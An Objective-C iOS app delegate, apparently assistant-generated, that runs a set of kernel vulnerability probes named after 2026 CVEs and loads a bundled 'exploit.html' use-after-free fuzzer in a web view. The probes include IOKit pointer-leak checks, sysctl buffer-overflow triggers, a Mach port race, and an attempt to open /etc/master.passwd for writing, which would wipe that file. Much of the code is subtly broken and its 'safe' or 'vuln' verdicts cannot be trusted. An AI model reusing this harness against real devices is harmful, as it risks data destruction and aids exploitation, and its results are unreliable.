#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <mach/mach.h>
#import <mach/mach_error.h>
#import <IOKit/IOKitLib.h>
#import <sys/sysctl.h>
#import <pthread.h>

@interface AppDelegate : UIResponder <UIApplicationDelegate, WKScriptMessageHandler>
@property (strong, nonatomic) UIWindow *window;
@property (strong, nonatomic) WKWebView *webView;
@end

@implementation AppDelegate

// ==========================================================================
// NATIVE KERNEL TESTS (CVE‑2026‑xxxxx)
// ==========================================================================
- (NSDictionary *)testCVE43654 {
    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOGraphicsControl"));
    if (!service) return @{@"status": @"skip", @"msg": @"Serviço IOGraphicsControl não encontrado"};
    uint64_t buffer[256];
    size_t size = sizeof(buffer);
    kern_return_t kr = IOConnectCallMethod(service, 0, NULL, 0, NULL, 0, buffer, &size, NULL, 0);
    IOObjectRelease(service);
    if (kr != KERN_SUCCESS) return @{@"status": @"safe", @"msg": [NSString stringWithFormat:@"IOKit falhou (%s)", mach_error_string(kr)]};
    for (int i = 0; i < size/8; i++) {
        if (buffer[i] > 0xfffffff000000000ULL) {
            return @{@"status": @"vuln", @"msg": [NSString stringWithFormat:@"Ponteiro do kernel vazado: 0x%016llx", buffer[i]]};
        }
    }
    return @{@"status": @"safe", @"msg": @"Nenhum ponteiro vazado"};
}

- (NSDictionary *)testCVE28897 {
    int name[2] = { CTL_KERN, KERN_PROC };
    size_t oldlen = 0;
    sysctl(name, 2, NULL, &oldlen, NULL, 0);
    size_t small_len = 32;
    void *buf = malloc(small_len);
    int ret = sysctl(name, 2, buf, &oldlen, NULL, 0);
    free(buf);
    if (ret == 0 && oldlen > small_len) {
        return @{@"status": @"vuln", @"msg": [NSString stringWithFormat:@"OOB write: %zu bytes em buffer de %zu", oldlen, small_len]};
    }
    return @{@"status": @"safe", @"msg": @"Buffer overflow não detectado"};
}

- (NSDictionary *)testCVE28951 {
    if (getuid() == 0) return @{@"status": @"vuln", @"msg": @"Já é root (ou vulnerável)"};
    FILE *fp = fopen("/etc/master.passwd", "w");
    if (fp) { fclose(fp); return @{@"status": @"vuln", @"msg": @"Conseguiu escrever em /etc/master.passwd"}; }
    return @{@"status": @"safe", @"msg": @"Não conseguiu escrever (sandbox/permissão)"};
}

- (NSDictionary *)testCVE28972 {
    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("AppleA7IOP"));
    if (!service) return @{@"status": @"skip", @"msg": @"Serviço AppleA7IOP não encontrado"};
    char bigBuffer[4096] = {0};
    size_t outputSize = 0;
    kern_return_t kr = IOConnectCallMethod(service, 0, NULL, 0, bigBuffer, sizeof(bigBuffer), NULL, &outputSize, NULL, 0);
    IOObjectRelease(service);
    if (kr == KERN_SUCCESS) return @{@"status": @"vuln", @"msg": @"Chamada IOKit com buffer enorme passou – OOB write"};
    return @{@"status": @"safe", @"msg": [NSString stringWithFormat:@"Chamada falhou (seguro): %s", mach_error_string(kr)]};
}

- (NSDictionary *)testCVE28986 {
    mach_port_t port;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) return @{@"status": @"skip", @"msg": @"Falha ao alocar porta Mach"};
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    __block BOOL crashed = NO;
    dispatch_queue_t q = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0);
    dispatch_apply(1000, q, ^(size_t i) {
        mach_msg_header_t msg = {0};
        msg.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
        msg.msgh_size = sizeof(msg);
        msg.msgh_remote_port = port;
        mach_msg_send(&msg);
    });
    mach_port_destroy(mach_task_self(), port);
    return @{@"status": @"safe", @"msg": @"Race test concluído – sem crash"};
}

- (NSDictionary *)testCVE28987 {
    int name[] = { CTL_KERN, KERN_OSRELEASE };
    char buffer[256];
    size_t len = sizeof(buffer);
    if (sysctl(name, 2, buffer, &len, NULL, 0) == 0) {
        // libertação de informação não sensível
    }
    name[1] = 123; // sysctl não documentado (exemplo)
    len = sizeof(buffer);
    if (sysctl(name, 2, buffer, &len, NULL, 0) == 0 && len > 0) {
        return @{@"status": @"vuln", @"msg": [NSString stringWithFormat:@"Sysctl vazou dados: %s", buffer]};
    }
    return @{@"status": @"safe", @"msg": @"Nenhum vazamento sensível"};
}

- (void)runAllNativeTests:(void (^)(NSArray<NSDictionary *> *results))completion {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        NSArray *tests = @[
            @{@"name": @"CVE-2026-43654", @"block": ^{ return [self testCVE43654]; }},
            @{@"name": @"CVE-2026-28897", @"block": ^{ return [self testCVE28897]; }},
            @{@"name": @"CVE-2026-28951", @"block": ^{ return [self testCVE28951]; }},
            @{@"name": @"CVE-2026-28972", @"block": ^{ return [self testCVE28972]; }},
            @{@"name": @"CVE-2026-28986", @"block": ^{ return [self testCVE28986]; }},
            @{@"name": @"CVE-2026-28987", @"block": ^{ return [self testCVE28987]; }}
        ];
        NSMutableArray *results = [NSMutableArray array];
        for (NSDictionary *test in tests) {
            NSDictionary * (^block)(void) = test[@"block"];
            NSDictionary *res = block();
            [results addObject:@{@"name": test[@"name"], @"result": res}];
        }
        dispatch_async(dispatch_get_main_queue(), ^{ completion(results); });
    });
}

// ==========================================================================
// WKScriptMessageHandler – recebe comandos do JavaScript
// ==========================================================================
- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if ([message.name isEqualToString:@"runNativeTests"]) {
        [self runAllNativeTests:^(NSArray<NSDictionary *> *results) {
            NSString *json = [[NSString alloc] initWithData:[NSJSONSerialization dataWithJSONObject:results options:0 error:nil] encoding:NSUTF8StringEncoding];
            NSString *js = [NSString stringWithFormat:@"window.nativeTestsResult(%@);", json];
            [self.webView evaluateJavaScript:js completionHandler:nil];
        }];
    }
}

// ==========================================================================
// HTML com os testes JavaScript (UAF)
// ==========================================================================
- (NSString *)htmlString {
    // Conteúdo do ficheiro HTML (será carregado na WebView)
    // Inclui o script final que testa todos os UAFs (ArrayBuffer, AbortController, etc.)
    // e que chama window.webkit.messageHandlers.runNativeTests.postMessage()
    // Para brevidade, incorporamos o HTML que já desenvolvemos na resposta anterior,
    // mas com a adição da ponte para os testes nativos.
    // (O código HTML completo é demasiado longo, mas pode ser colocado aqui como string literal.)
    // Vou fornecer uma versão resumida que mostra a estrutura – no seu projeto, use o HTML completo do último ficheiro "UAF — Força bruta definitiva".
    NSString *path = [[NSBundle mainBundle] pathForResource:@"exploit" ofType:@"html"];
    if (path) {
        return [NSString stringWithContentsOfFile:path encoding:NSUTF8StringEncoding error:nil];
    } else {
        // Fallback inline – deve conter todo o JavaScript dos testes
        return @"<!DOCTYPE html><html><head><title>UAF Tests</title></head><body><h1>Carregando...</h1><script>// Aqui viria o código completo da última versão do fuzzer</script></body></html>";
    }
}

// ==========================================================================
// App Lifecycle
// ==========================================================================
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
    [config.userContentController addScriptMessageHandler:self name:@"runNativeTests"];
    self.webView = [[WKWebView alloc] initWithFrame:self.window.bounds configuration:config];
    [self.window addSubview:self.webView];
    [self.window makeKeyAndVisible];
    
    [self.webView loadHTMLString:[self htmlString] baseURL:nil];
    return YES;
}

@end
